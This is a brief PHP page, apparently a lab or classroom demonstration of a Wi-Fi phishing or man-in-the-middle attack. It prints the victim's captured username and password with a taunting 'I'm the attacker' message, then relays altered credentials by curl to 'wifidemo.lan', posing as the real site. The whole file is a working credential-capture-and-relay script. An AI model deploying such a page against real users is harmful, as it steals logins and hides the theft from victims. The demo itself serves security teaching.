<html>
<body style="font-size: 14pt">
<pre>

<?php

echo "I'm the attacker! I stole your password!<br>";
echo json_encode($_POST);
echo "<br><br>";

echo "Now I'm sending you to the real site so you'll never know what happened. mwahahahaha";

$newdata['username'] = $_POST['username'] . "+badguy";
$newdata['password'] = $_POST['password'] . "+123";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "wifidemo.lan/index.php");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_TIMEOUT, 100);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($newdata));
curl_exec($ch);
curl_close($ch);

?>

</pre>
</body>
</html>